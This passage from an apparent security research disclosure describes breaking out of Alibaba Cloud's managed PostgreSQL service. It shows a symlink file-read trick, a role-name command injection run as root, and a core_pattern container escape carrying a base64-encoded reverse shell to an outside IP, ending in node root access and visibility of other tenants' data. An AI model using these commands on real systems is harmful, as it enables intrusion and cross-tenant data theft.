We realized that it was an operation log belonging to another container responsible for performing certain operations on our database container. This shed a light on the container’s nature and provided useful information such as file paths. 

We then searched for interesting features to exploit in the Alibaba Cloud portal like with AnalyticDB, and stumbled upon the revocation file configuration. Behind the scenes, it triggered these logs: 

![](data:image/jpeg;base64,/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEAAoHBwgHBgoICAgSFhYUDg8QDA0NDhYNDQUYFxUZGCITFhUaHysjGh0oHRUWJDUlKC0vMjIyGSI4PTcwPCsxMi8BCgsLDgsOFQ0NHDsdFhwvLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vL//AABEIAAoAGAMBIgACEQEDEQH/xAAZAAACAwEAAAAAAAAAAAAAAAABAgMFBgD/xAAeEAACAAYDAAAAAAAAAAAAAAAAAgEDBBEhQhIyM//EABYBAAMAAAAAAAAAAAAAAAAAAAACA//EABgRAAMBAQAAAAAAAAAAAAAAAAABEhMC/9oADAMBAAIRAxEAPwDNOzccCPOeEq1iXUSb5CWXXCKqpeMVyEFV1OCwzR//2Q==)

The logs from the file /tmp/tools_log/docker_tools.log

Highlighted in red are the logs showing the execution of the `_sed_` command. Although the `_sed_` commands were executed in a second container, they made modifications to the `_/data/pg_hba.conf_` configuration file that was shared with our database container. 

For those unfamiliar with the [_sed -i_](https://linux.die.net/man/1/sed) (in-place) command, it works by first copying the target file to a temporary location, making the desired modifications using a regular expression, and then moving the edited file back to its original location. We discovered that this behavior could be exploited via a symbolic link attack to copy files from the second container. 

To carry out this attack, we needed to use a symbolic link to replace the `_/data/pg_hba.conf_` configuration file with a reference to the desired file in the second container. Activating the "revocation list" feature in the Alibaba Cloud portal would then initiate the `_sed -i_` command in the second container and overwrite `_/data/pg_hba.conf_` with the desired file from the second container. 

In the following example we created a symbolic link to `_k8s_ctx.py_` __(we retrieved its path from the logs). 
  
  
  $: unlink pg_hba.conf; ln -s *REDACTED*/operator/k8s_ctx.py pg_hba.conf 

We then updated the “revocation list” in the Alibaba Cloud portal and observed the changes of the `_pg_hba.conf_` __ file. When we read it, we could see the content of our desired file! 
  
  
  # Reading a file from the second container
  $: cat pg_hba.conf  
  import os 
  import pwd 
  from *REDACTED*/operator.utils.envs import ToolImageEnv 
  from *REDACTED*/operator.k8s_ctx import db_ctx_pgsql_config, db_ctx_pgsql_database, db_ctx_pgsql_replica, \ 
      db_ctx_pgsql_system, db_ctx_pgsql_switch 
  … 

Repeating this operation for any import in the Python files enabled us to obtain the full Python source code that was running in the second container, and therefore generate a new attack surface. 

The source code indicated that a new container with the same code is created for almost any managing operation on our database, and its operation is determined by the environment variables passed to it. This information was very useful to us when escaping to the host. 

#### Exploiting an RCE and escaping to the host (K8s node) 

Alibaba Cloud provides a feature that verifies whether a PostgreSQL instance can be upgraded to a newer version before proceeding with a selected upgrade. This is intended to avoid damaging the database. 

![](data:image/jpeg;base64,/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEAAoHBwgHBgoICAgLCgoVDh0VDg0NDhIVFhEdFxMdGBYVFhUdHyslJh0oHSEWJDUlKC0vMjIyGSI4PTcwPCsxMi8BCgsLDg0OFREQHDsoIigvOy8vLzs7Oy8vLy8vLy8vLy8vLzsvLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vL//AABEIAA8AGAMBIgACEQEDEQH/xAAYAAACAwAAAAAAAAAAAAAAAAAABQIEB//EAB0QAAICAQUAAAAAAAAAAAAAAAABAxECBAUhMTL/xAAVAQEBAAAAAAAAAAAAAAAAAAABAP/EABcRAAMBAAAAAAAAAAAAAAAAAAABERL/2gAMAwEAAhEDEQA/ANeqRyXRT3COXJ8IaEW10xTgQUaCOfHPywG6eN0gHZQ//9k=)

The upgrade check feature

We audited this feature in the code we retrieved and found a command line injection vulnerability that allowed us to execute code in the container responsible for this operation. 

Here is the vulnerable function: 

![](data:image/jpeg;base64,/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEAAoHBwgHBgoICAgLFQoXDhgQFQUVDikVDREMFxcZGBYfFhUaHyslGh0oHSEWJDUlKC0vMjIyGSI4PTcwPCsxMi8BCgsLDg0OHA0QHDsdFh0vLy8vLy81Ly8vLy8vNS8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vL//AABEIAAkAGAMBIgACEQEDEQH/xAAZAAACAwEAAAAAAAAAAAAAAAAEBQECBgD/xAAgEAABAwIHAAAAAAAAAAAAAAABAAIFAzQEBhESFCEy/8QAFwEAAwEAAAAAAAAAAAAAAAAAAQIDAP/EABgRAQEBAQEAAAAAAAAAAAAAAAEAEgMC/9oADAMBAAIRAxEAPwDDszBKPxGhYUaJaSHZaUNRuQmZ8rHkjtlTZyS5RG0rleneFSmwUXo3/9k=)

The _`install_user`_ __ argument was formatted into a command line without any sanitization; the command was later executed with root permissions! But could we control _`install_user`_? Yes, it was selected from our database with the following query:
  
  
  select rolname from pg_authid where oid=10; 

This query returned the PostgreSQL superuser role name, i.e. the admin username of the database. 

Since Alibaba Cloud used the `alicloud_rds_admin` role name for this service's superuser, we performed the actions below to gain code execution within the container responsible for the “version upgrade check”: 

  1. Started the version upgrade check via the Alibaba Cloud Portal. 

  2. Changed the `_alicloud_rds_admin_` PostgreSQL username to a command line injection using the ALTER ROLE statement: `"ALTER ROLE \"alicloud_rds_admin\" RENAME TO \"\`id\`\";" `

  3. Waited 5 seconds for the processes to finish. 

  4. Recovered the username. 

Although we had some length limitations on the username at start, this flow worked perfectly, and we managed to execute code as root in the "version upgrade check" container! 

Given this container was privileged, we could use the `core_pattern` container escape technique: 

  * If `_/proc/sys_` is mounted as writable (which it was), we could overwrite `_/proc/sys/kernel/core_pattern_` _,_ which defines a template that names core dump files. 

  * The syntax of `_/proc/sys/kernel/core_pattern_` allows piping core dumps to a program via the `|` character. Since `_core_pattern_` is shared with the host, the program would be executed on the host machine in the event of a crash. This would allow container escape. 

Fortunately for us, all the conditions for this technique were met. We overwrote the `core_pattern` with a bash reverse shell (encoded in base64): 
  
  
  echo '|/bin/bash -c 
  echo${IFS%%??}L2Jpbi9iYXNoIC1pPiYvZGV2L3RjcC8yMC4xMjQuMTk0LjIxMi82MDAwMSAwPiYxCg==|base64${
  IFS%%??}-d|/bin/bash' > /proc/sys/kernel/core_pattern 

Returning to our PostgreSQL container, all we had to do was crash our process: 
  
  
  $: sh -c 'kill -11 "$$"' 

And we got a reverse shell from the host (K8s node)!
  
  
  [root@i-gw80v6j*REDACTED* /] 
  
  $: id 
  uid=0(root) gid=0(root) groups=0(root) 

#### K8s cross-tenant access 

Like with AnalyticDB, we utilized the powerful [_kubelet_](https://kubernetes.io/docs/reference/command-line-tools-reference/kubelet/) credentials to gather information on the cluster. 

We listed all the pods and observed that several of the tenant's databases were located on the same node. That’s when we realized that our node was hosting multiple tenants. As soon as we noticed this, we immediately stopped our research and refrained from accessing other customers' data. 
  
  
  # Other customers’ data mounted on our node
  $: mount | grep -i /mount | grep -ioE 'pgm-(.*?)/' | sort | uniq 
  pgm-*REDACTED*-data-19d1322c/ 
  pgm-*REDACTED*-data-15c361da/ 
  pgm-*REDACTED*-data-38f60684/ 
  pgm-*REDACTED*-data-61b4d30a/ 
  pgm-*REDACTED*-data-0197fb99/ 
  pgm-*REDACTED*-data-0fa7676b/ 
  pgm-*REDACTED*-data-52250988/ 
  pgm-*REDACTED*-data-8d044ffb/ 
  pgm-*REDACTED*-data-09290508/ 
  pgm-*REDACTED*-data-bc610a92/ 
  pgm-*REDACTED*-data-d386ec2d/ 
  pgm-*REDACTED*-data-ed5993d7/ 
  pgm-*REDACTED*-data-a554506c/ 
  pgm-*REDACTED*-data-d99da2be/ 

This concludes the technical details of our research on both AnalyticDB and ApsaraDB RDS. 

Tags

[#Research](/blog/tag/research)[#Security](/blog/tag/security)
